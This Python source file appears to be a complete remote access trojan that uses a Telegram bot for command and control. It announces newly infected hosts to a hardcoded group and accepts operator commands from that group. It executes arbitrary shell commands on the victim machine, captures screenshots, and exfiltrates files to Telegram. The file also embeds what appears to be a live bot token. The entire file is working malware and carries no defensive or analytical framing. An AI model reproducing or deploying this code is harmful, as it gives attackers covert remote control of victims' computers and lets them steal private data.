import os, io
import re
import subprocess
import time
import uuid
import requests
import pyautogui
import platform


class TGBotRAT:
    def __init__(self, tgbot_token):
        self.TGBotToken = tgbot_token
        self.UUID = None
        self.tg_info = None
        self.ReConn_Max = 5
        self.ReConn_Time = 60
        self.ChatName = "@xiaokunyihaoBot"
        self.GroupID = "-1002035867279"
        self.UserID = {}
        self.offset = None
        self.max_send_size = 50 * 1024 * 1024
        self.get_platform = platform.platform()

    def help(self):
        return f"""
支持的命令：
    help                                                    查看帮助信息
    getuuids                                                查看所有存活主机信息
    <uuids> <shell options>                                 执行相关指令
    
    shell options选项如下：
        set uuid <new uuid>                                 设置新的uuid
        screenshot                                          获取实时截图
        upload <current filepath> <target filepath>         上传文件至指定目标地址
        download <target filepath>                          下载指定目标文件（最大支持50MB）
        <shell命令>                                          执行相关系统命令
        
注意：群组中执行命令格式统一为 {self.ChatName} <支持的命令> <shell options>
"""

    def get_chat_members(self):
        try:
            data = requests.get(
                f"https://api.telegram.org/bot{self.TGBotToken}/getChatAdministrators?chat_id={self.GroupID}").json()
        except Exception as e:
            print(404, "发生错误：", e)
        else:
            if data["ok"] and 'result' in data:
                members = data['result']
                # 提取每个成员的用户ID
                for member in members:
                    if not member['user']['is_bot'] and member['user']['id'] not in self.UserID:
                        self.UserID[member['user']['id']] = member['user']["username"]
            else:
                print("Failed to get chat members.")

    def getUpdates(self):
        if self.offset is None:
            param = False
        else:
            param = {'offset': self.offset + 1, 'timeout': 30}
        try:
            response = requests.get(f"https://api.telegram.org/bot{self.TGBotToken}/getUpdates",
                                    params=param).json()
        except:
            return False
        else:
            if self.offset is None and response["ok"] and len(response['result']) > 0 and response['result'][-1][
                'update_id'] != "":
                self.offset = response['result'][-1]['update_id']
            if response["ok"] and len(response['result']) > 0:
                updates = []
                for item in response['result']:

                    if 'message' not in item:
                        message = item['edited_message']
                    else:
                        message = item['message']
                    if message['from']['is_bot'] is False and message['from'][
                        'id'] in self.UserID and "text" in message:
                        if message["chat"]["type"] == "supergroup":
                            matches = re.search(f"{self.ChatName}\s*(.*)", str(message['text']))
                        else:
                            matches = re.search(f"(.*)", str(message['text']))
                        if matches:
                            matches = matches.group(1).split(" ")
                            if matches[0].replace(" ", "") == str(self.UUID):
                                shell_text = ' '.join(matches[1:]).lstrip(" ")
                                updates.append({'chatid': message['chat']['id'],
                                                'username': [message['from']['id']],
                                                'text': shell_text})
                            elif matches[0].replace(" ", "") == 'getuuids':
                                updates.append({'chatid': message['chat']['id'],
                                                'username': [message['from']['id']],
                                                'text': 'getuuids'})
                            # else:
                            #     updates.append({'chatid': message['chat']['id'],
                            #                     'username': [message['from']['id']],
                            #                     'text': 'help'})
                        self.offset = response['result'][-1]['update_id']
                return updates
            else:
                return False

    def send_chat_msg(self, updates, before_text="", flag=True):
        msg = ""
        for item_user in updates["username"]:
            msg += f"@{self.UserID[item_user]} "
        if flag:
            msg += f"\n{before_text}主机UUID：{self.UUID}\n系统及版本：{self.get_platform}\n" + updates["text"]
        else:
            msg += f"{before_text}\n" + updates["text"]
        try:
            requests.post(
                f"https://api.telegram.org/bot{self.TGBotToken}/sendMessage?chat_id={updates['chatid']}&parse_mode={updates['type']}",
                data={"text": msg})
        except:
            pass

    def send_chat_img(self, updates):
        msg = ""
        for item_user in updates["username"]:
            msg += f"@{self.UserID[item_user]} "
        msg += f"\n主机UUID：{self.UUID}\n系统及版本：{self.get_platform}\n" + updates["text"]
        try:
            files = {
                "photo": ("screen.png",updates['img'])
            }
            requests.post(
                f"https://api.telegram.org/bot{self.TGBotToken}/sendPhoto",
                params={"chat_id": updates['chatid'], "caption": msg}, files=files)
        except:
            pass

    def send_chat_file(self, updates):
        msg = ""
        for item_user in updates["username"]:
            msg += f"@{self.UserID[item_user]} "
        msg += f"\n主机UUID：{self.UUID}\n系统及版本：{self.get_platform}\n" + updates["text"]
        file = {
            "document": (updates['file']['filename'], updates['file']['filecontent'])
        }
        print(file)
        try:
            print("发送文件")
            s = requests.post(
                f"https://api.telegram.org/bot{self.TGBotToken}/sendDocument",
                params={"chat_id": updates['chatid'], "caption": msg}, files=file)
            print(s.json())
        except Exception as e:
            return False, f"发送文件失败！\n详情信息如下：{e}"

        # response = requests.post(f"https://api.telegram.org/bot{self.TGBotToken}/sendVideo",
        #                          params={"chat_id": self.tg_info["message"]["chat"]["id"]}, files=files,
        #                          headers={'Content-Type': 'video/mp4'}).json()
        # if response["ok"]:
        #     self.tg_info = response["result"]
        #     print(response)
        # else:
        #     print('发送失败')

    def handler_center(self, updates):
        for item_user in updates:
            cmd_list = str(item_user["text"]).split(" ")
            sendmsg = {
                "chatid": item_user["chatid"],
                "username": item_user['username'],
                'type': '',
            }
            print(cmd_list[0], cmd_list)
            if cmd_list[0] == "help":
                sendmsg["type"] = 'Markdown'
                sendmsg["text"] = f"目前支持的命令如下：\n```text\n{self.help()}```"
                self.send_chat_msg(sendmsg)
            elif cmd_list[0] == "getuuids":
                sendmsg["text"] = f"状态：存活！"
                self.send_chat_msg(sendmsg)
            elif cmd_list[0] == "set":
                if cmd_list[1] == "uuid":
                    self.UUID = cmd_list[2].replace(" ", "")
                    sendmsg["text"] = f"已成功更新UUID会话标识！"
                else:
                    sendmsg["text"] = f"该命令 {cmd_list} 并不存在，请使用命令 help 查看语法后操作！"
                self.send_chat_msg(sendmsg)
            elif cmd_list[0] == "screenshot":
                result, flag = self.screenshot()
                if flag:
                    sendmsg["img"] = result
                    sendmsg["text"] = f"screenshot命令执行成功！"
                    self.send_chat_img(sendmsg)
                else:
                    sendmsg["text"] = f"screenshot命令执行失败！\n详细信息如下：{result}"
                    self.send_chat_msg(sendmsg)
            elif cmd_list[0] == "upload":
                self.send_chat_msg(sendmsg)
            elif cmd_list[0] == "download":
                self.download(item_user, " ".join(cmd_list[1:]).lstrip(" "))
            elif cmd_list[0] == "getinfo":
                self.send_chat_msg(sendmsg)
            else:
                flag, result = self.command_exec(cmd_list)
                sendmsg["type"] = "Markdown"
                if flag:
                    sendmsg["text"] = f"执行系统命令成功！\n```text\n{result}```"
                else:
                    sendmsg["text"] = f"执行系统命令失败！\n```text\n{result}```"
                self.send_chat_msg(sendmsg)

    def download(self, updates, t_filepath):
        sendmsg = {
            "chatid": updates["chatid"],
            "username": updates['username'],
            "file": {
                "filename": os.path.basename(t_filepath)
            }
        }
        if '/' in str(t_filepath).replace("\\\\", "\\").replace("\\", "/"):
            try:
                with open(file=t_filepath, mode="r", encoding="utf8") as f:
                    filesize = os.path.getsize(t_filepath)
                    i = 1
                    while True:
                        chunk = f.read(50 * 1024 * 1024)
                        if not chunk:
                            break
                        sendmsg[
                            'text'] = f"文件名：{sendmsg['file']['filename']} \n当前下载状态：已完成 {str(i)}/{str(1 if int(filesize / self.max_send_size) < 1 else int(filesize / self.max_send_size))}"
                        sendmsg['file']['filecontent'] = chunk
                        self.send_chat_file(sendmsg)
                        i += 1
            except Exception as e:
                print(e)

        else:
            pass

    def screenshot(self):
        try:
            screenshot = pyautogui.screenshot()
            img_byte_arr = io.BytesIO()
            screenshot.save(img_byte_arr, format='PNG')
            img_byte_arr.seek(0)
            return img_byte_arr, True
        except Exception as e:
            return e, False

    def command_exec(self, command):
        command_shell = " ".join(command).lstrip(" ")
        pf = re.search("^([a-zA-Z]:)", command[0])
        if command[0] == "cd" or pf:
            command_shell = command_shell.replace("/", "\\")
            if pf:
                newdir = pf.group(1)
            else:
                newdir = "".join(command[1:]).lstrip(" ")
            try:
                os.chdir(newdir)
            except FileNotFoundError as e:
                return False, f"执行失败！\n原因：找不到目录\n系统错误详情：{e}"
            except Exception as e:
                return False, f"执行失败！\n系统错误详情：{e}"
        result = subprocess.Popen(command_shell, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, )
        output, error = result.communicate()
        if output is not None:
            return True, output.decode('gbk', errors='ignore')
        if error is not None:
            return False, error.decode('gbk', errors='ignore')
        return True, "执行完毕！"
    def main(self):
        self.UUID = uuid.uuid4()
        flag = False
        while True:
            self.get_chat_members()
            if not flag:
                flag = True
                self.send_chat_msg(
                    {"chatid": self.GroupID, "username": self.UserID, "text": "", "type": ""},
                    before_text="新的主机上线！\n")
            updates = self.getUpdates()
            if updates:
                self.handler_center(updates)
            time.sleep(1)


if __name__ == '__main__':
    NewTgbot = TGBotRAT(tgbot_token="7145600460:AAH8H9zt4jRe3Pog6WWfEUstiHFIvYI4ke8").main()
